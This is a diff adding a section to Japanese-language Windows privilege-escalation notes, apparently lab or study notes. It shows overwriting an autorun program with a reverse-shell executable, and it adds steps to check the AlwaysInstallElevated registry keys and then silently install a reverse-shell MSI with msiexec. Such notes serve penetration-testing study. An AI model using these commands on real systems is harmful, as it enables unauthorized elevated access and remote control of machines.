@@ -43,4 +43,18 @@ reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
 バイナリを書き換えて、ログインし直す。
 copy C:\PrivEsc\reverse.exe "C:\Program Files\Autorun Program\program.exe" /Y
 
+【3. msi ファイルを利用したリバースシェルの実行】
+・条件
+reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+両方の Key値が 0x1 であること
+・方法
+msi ベースのリバースシェルを実行 (ダブルクリックでも良いが、以下だと UI が出ない。）
+msiexec /quiet /qn /i C:\PrivEsc\reverse.msi
+
+
+
+
+
+
 
